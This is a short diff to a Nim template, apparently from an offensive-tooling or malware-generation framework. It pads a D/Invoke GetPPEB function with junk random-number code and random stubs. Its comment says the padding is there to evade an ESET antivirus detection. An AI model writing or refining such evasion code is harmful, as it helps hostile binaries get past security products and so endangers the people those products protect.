@@ -85,11 +85,22 @@ proc GetPPEB(p: culong): P_PEB {.
 """
 
 let DInvokeGetPEB * = fmt"""
+import random
+proc calcRand *(): int =
+  var rand: int = 0
+  for i in 0 .. 10:
+    rand += rand(0..100)
+    if ((rand mod 9) != 0):
+      rand += rand(0..100)
+  return rand
 
 proc GetPPEB * (p: culong): P_PEB = 
+  randomize()
   # We need to put any stuff before and after this function, to avoid an ESET detection. It flags any Nim binary that uses this function alone.
   {getRandStubInFunc()}
+  discard calcRand()
   return cast[P_PEB](RtlGetCurrentPeb())
+  discard calcRand()
   {getRandStubInFunc()}
 
 """
